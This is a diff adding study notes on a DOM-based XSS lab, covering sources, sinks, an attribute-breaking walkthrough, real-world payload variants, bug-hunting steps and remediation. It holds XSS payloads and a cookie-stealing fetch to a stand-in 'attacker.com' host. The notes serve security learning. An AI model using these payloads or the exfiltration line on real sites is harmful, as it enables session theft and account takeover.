@@ -813,3 +813,526 @@ Stored XSS = Persistent
 Reflected XSS = Immediate  
 
 Persistent = More dangerous
+
+---
+
+# Lab-3 🐞 DOM-Based XSS (document.write + location.search) — Enhanced & Real-World Complete Notes
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (DOM XSS) occurs when:
+
+- User input enters the browser through the URL or another DOM source  
+- JavaScript reads that input  
+- The script inserts the input into the page using a dangerous function  
+- The browser interprets it as HTML or JavaScript and executes it  
+
+Important difference:
+
+The vulnerability exists **inside client-side JavaScript** running in the browser.
+
+The server response itself may be completely safe.
+
+Execution happens **when the DOM is modified by JavaScript.**
+
+### Flow
+
+User Input  
+→ DOM Source  
+→ JavaScript  
+→ Dangerous Sink  
+→ Script Execution  
+
+---
+
+## 🔹 What Is This Topic?
+
+DOM XSS occurs when JavaScript takes attacker-controlled input and writes it into the page without sanitization.
+
+Two key components define the vulnerability.
+
+### Source
+
+A **source** is where attacker-controlled data enters JavaScript.
+
+Common sources:
+
+- location.search  
+- location.hash  
+- document.cookie  
+- document.referrer  
+- window.name  
+- postMessage  
+- localStorage  
+- sessionStorage  
+
+Example URL:
+
+site.com/?search=hello
+
+JavaScript reads:
+
+location.search
+
+---
+
+### Sink
+
+A **sink** is a dangerous JavaScript function that inserts or executes the data.
+
+Common sinks:
+
+- document.write()  
+- innerHTML  
+- outerHTML  
+- insertAdjacentHTML()  
+- eval()  
+- setTimeout()  
+- setInterval()  
+- Function()  
+
+Example vulnerable code:
+
+document.write(location.search)
+
+---
+
+## 🔹 Lab Walkthrough (Simple & Clear)
+
+### Step 1 — Open the Lab
+
+The website contains a search feature.
+
+Search query appears in the URL.
+
+Example:
+
+site.com/?search=test
+
+---
+
+### Step 2 — Test Reflection with Safe Marker
+
+Input:
+
+ABC123
+
+Open **Developer Tools → Inspector**
+
+Search for:
+
+ABC123
+
+Found inside DOM:
+
+<img src="/resources/images/tracker.gif?search=ABC123">
+
+This confirms:
+
+Input appears inside an **image src attribute**.
+
+---
+
+### Step 3 — Identify JavaScript Vulnerability
+
+The page uses:
+
+document.write()
+
+with:
+
+location.search
+
+Data flow:
+
+location.search  
+→ document.write()  
+→ DOM
+
+JavaScript is writing attacker input directly into the DOM.
+
+---
+
+### Step 4 — Craft Exploit Payload
+
+Since input is inside an **HTML attribute**, we must break the attribute.
+
+Payload:
+
+"><svg onload=alert(1)>
+
+---
+
+### Step 5 — Browser Parses Payload
+
+Original DOM:
+
+<img src="/tracker?search=ABC123">
+
+After payload:
+
+<img src="">
+<svg onload=alert(1)>
+
+SVG loads.
+
+onload executes.
+
+Alert appears.
+
+---
+
+### Step 6 — DOM Changes After Exploit
+
+Inspector now shows:
+
+<svg onload="alert(1)">
+
+JavaScript executes.
+
+→ ✅ Lab solved
+
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+### Screenshot-1
+![DOM XSS payload breaking image tag](../images/dom-xss-string-test.png)
+
+### Screenshot-2
+![DOM XSS marker reflected in live DOM](../images/dom-xss-marker-reflection.png)
+
+---
+
+# 🌍 Real-World Scenarios (COMPLETE — Context + Payload + Why)
+
+---
+
+## 🟢 1️⃣ document.write (Legacy Websites)
+
+Example code:
+
+document.write(location.search)
+
+Payload:
+
+<script>alert(1)</script>
+
+Why it works:
+
+document.write inserts raw HTML directly into the page.
+
+Common in:
+```
+- Legacy CMS plugins  
+- Old analytics scripts  
+- Tracking systems  
+```
+---
+
+## 🟢 2️⃣ Attribute Injection
+
+Example:
+
+document.write('<img src="'+location.search+'">')
+
+Payload:
+
+"><svg onload=alert(1)>
+
+Breaks attribute → injects new tag.
+
+Real-world locations:
+```
+- Tracking pixels  
+- Marketing scripts  
+- Image previews  
+```
+---
+
+## 🟢 3️⃣ innerHTML Sink
+
+Example:
+
+results.innerHTML = location.search
+
+Payload:
+
+<img src=x onerror=alert(1)>
+
+Very common in:
+```
+- Search result pages  
+- Filters  
+- Dynamic UI updates  
+```
+---
+
+## 🟢 4️⃣ JavaScript Execution Sinks
+
+Example:
+
+eval(location.hash)
+
+Payload:
+
+#alert(1)
+
+Also vulnerable:
+
+- setTimeout(location.hash)  
+- Function(location.hash)  
+
+Seen in:
+```
+- Debug tools  
+- Old JS frameworks  
+- Dynamic script loaders  
+```
+---
+
+## 🟢 5️⃣ URL Fragment Attacks
+
+Example source:
+
+location.hash
+
+URL:
+
+site.com/#<img src=x onerror=alert(1)>
+
+Common in:
+```
+- Single-page applications  
+- Navigation tabs  
+- Client-side routing  
+```
+---
+
+## 🟢 6️⃣ Search Result Rendering
+
+Example code:
+
+document.getElementById("results").innerHTML =
+"You searched: " + location.search
+
+Payload:
+
+<img src=x onerror=alert(1)>
+
+Seen in:
+```
+- E-commerce search pages  
+- Dashboards  
+- Analytics panels  
+```
+---
+
+## 🟢 7️⃣ Referrer-Based DOM XSS
+
+Source:
+
+document.referrer
+
+If attacker controls referring page → payload executes.
+
+Seen in:
+```
+- Affiliate programs  
+- Marketing tracking scripts  
+```
+---
+
+# 🎯 High-Value DOM XSS Targets
+
+Always test:
+```
+- Search features  
+- Filters  
+- URL parameters  
+- Client-side routing  
+- Comment previews  
+- Product previews  
+- Admin dashboards  
+- Analytics scripts  
+- Tracking widgets  
+```
+---
+
+# 🔗 Multi-Chain Real Attacks
+
+---
+
+## 🔥 XSS → Session Theft
+
+fetch("https://attacker.com?cookie="+document.cookie)
+
+Steals session cookies.
+
+---
+
+## 🔥 XSS → Account Takeover
+
+Steal:
+
+- JWT tokens  
+- Session cookies  
+- CSRF tokens  
+
+---
+
+## 🔥 XSS → Admin Compromise
+
+Admin visits infected page.
+
+Attacker gains administrator access.
+
+---
+
+## 🔥 XSS → Data Exfiltration
+
+JavaScript can read:
+
+- DOM content  
+- API responses  
+- Private user data  
+
+---
+
+## 🔥 XSS → CSRF Automation
+
+Payload performs actions automatically.
+
+Example:
+
+fetch("/change-email",{method:"POST"})
+
+---
+
+# 🧪 How to Find DOM XSS (Bug Hunter Methodology)
+
+---
+
+## Step 1 — Identify Sources
+
+Search JavaScript for:
+```
+- location.search  
+- location.hash  
+- document.cookie  
+- document.referrer  
+- window.name  
+```
+Use DevTools search:
+
+Ctrl + Shift + F
+
+---
+
+## Step 2 — Inject Test Marker
+
+Example:
+
+XSS123TEST
+
+---
+
+## Step 3 — Inspect Live DOM
+
+Important rule:
+
+Always inspect **Live DOM**, not **View Source**.
+
+DOM XSS appears **after JavaScript executes**.
+
+---
+
+## Step 4 — Find Sink
+
+Look for:
+```
+- document.write  
+- innerHTML  
+- eval  
+- setTimeout  
+- Function  
+```
+---
+
+## Step 5 — Craft Payload Based on Context
+
+Attribute context:
+
+"><svg onload=alert(1)>
+
+HTML context:
+
+<script>alert(1)</script>
+
+JS string context:
+
+';alert(1);//
+
+---
+
+# 🛡️ Remediation (Developer Fix)
+
+Developers should:
+
+- Avoid document.write()  
+- Avoid innerHTML for untrusted input  
+- Use textContent  
+- Sanitize inputs  
+- Use secure frameworks  
+- Implement CSP  
+
+Safe example:
+
+element.textContent = userInput
+
+This prevents HTML execution.
+
+---
+
+# 💡 Extra Notes / Pro Hunter Mindset
+
+Source ≠ vulnerability  
+Sink ≠ vulnerability  
+
+Source + Sink + Unsafe Flow = DOM XSS
+
+Always ask:
+
+- Where does input enter JavaScript?  
+- Which function writes it into the DOM?  
+- What context is the output in?  
+- Can I break that context?  
+
+DOM XSS hunting requires **tracking data flow inside JavaScript.**
+
+---
+
+# 🧠 Ultimate Mental Model
+
+Find source  
+→ Track data flow in JavaScript  
+→ Identify sink  
+→ Determine context  
+→ Break context  
+→ Execute payload  
+→ Escalate impact  
+
+---
+
+# 💡 Key Difference Between XSS Types
+
+Reflected XSS  
+→ Server immediately reflects input
+
+Stored XSS  
+→ Server stores input in database
+
+DOM XSS  
+→ JavaScript processes input inside the browser
